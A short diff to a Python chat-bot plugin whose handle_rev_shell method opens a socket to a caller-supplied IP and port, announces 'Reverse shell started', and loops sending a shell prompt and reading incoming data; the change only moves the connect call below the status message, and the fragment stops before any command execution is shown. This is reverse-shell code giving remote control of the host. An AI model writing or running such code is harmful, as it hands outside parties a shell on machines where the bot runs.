@@ -28,8 +28,8 @@ class Main(Plugin):
     def handle_rev_shell(self, chat_id, ip, port):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip, int(port)))
             self.bot.send_message(chat_id, 'Reverse shell started at host {}:{}'.format(ip, port))
+            s.connect((ip, int(port)))
             while True:
                 s.send('{} $ '.format(self.bot.node).encode('utf-8'))
                 data = s.recv(self.bot.socket_buffer_size).decode('utf-8', 'ignore')
